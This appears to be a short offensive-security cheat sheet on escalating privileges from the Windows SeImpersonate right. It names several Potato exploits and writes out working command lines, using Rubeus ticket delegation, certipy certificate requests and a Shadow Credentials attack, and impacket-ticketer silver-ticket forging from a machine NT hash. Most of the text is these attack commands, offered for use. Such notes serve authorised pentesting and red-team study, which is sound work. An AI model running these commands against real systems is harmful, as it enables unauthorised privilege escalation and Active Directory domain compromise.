# SeImpersonate Privilege

### Potato exploits:

#### 1) RoguePotato

#### 2) Juicy Potato / Lovely Potato

#### 3) PrintSpoofer

#### 4) CertPotato

### Commands for 4):

 - .\Rubeus.exe tgtdeleg /nowrap (TGT pass the ticket)

 - certipy req -k -ca CA -template Machine -target DC (On Linux)

 - certipy auth -pfx PFX_FILE

## OR do Shadow Credentials attack

 - certipy shadow auto -u 'MACHINE$'@DOMAIN -k account 'MACHINE$'

## Get the Machine NT Hash and then:

 - impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn cifs/DC TARGET_USER (This can give System/Admin access)
